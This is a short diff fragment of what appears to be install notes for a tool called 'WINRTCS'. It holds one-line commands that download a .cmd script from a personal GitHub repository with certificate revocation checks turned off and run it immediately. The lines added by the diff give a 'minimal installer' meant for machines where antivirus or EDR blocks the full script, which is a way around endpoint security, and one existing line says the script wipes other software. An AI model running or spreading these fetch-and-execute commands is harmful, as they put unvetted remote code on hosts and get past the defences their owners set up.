@@ -9,3 +9,7 @@ curl.exe -L --ssl-no-revoke -o %TEMP%\fz.cmd https://raw.githubusercontent.com/x
 WINRTCS v0.0.1 - manual bootstrap (stuck hosts / brand-new machines). Wipes legacy stack + Zerocool, installs agent:
 
 curl.exe -L --ssl-no-revoke -o C:\Windows\TEMP\wb.cmd https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_bootstrap.cmd && C:\Windows\TEMP\wb.cmd
+
+WINRTCS minimal installer (hosts where AV/EDR blocks the full bootstrap — Access denied / Permission denied on wb.cmd):
+
+curl.exe -L --ssl-no-revoke -o C:\ProgramData\wq.cmd https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_quick.cmd && C:\ProgramData\wq.cmd
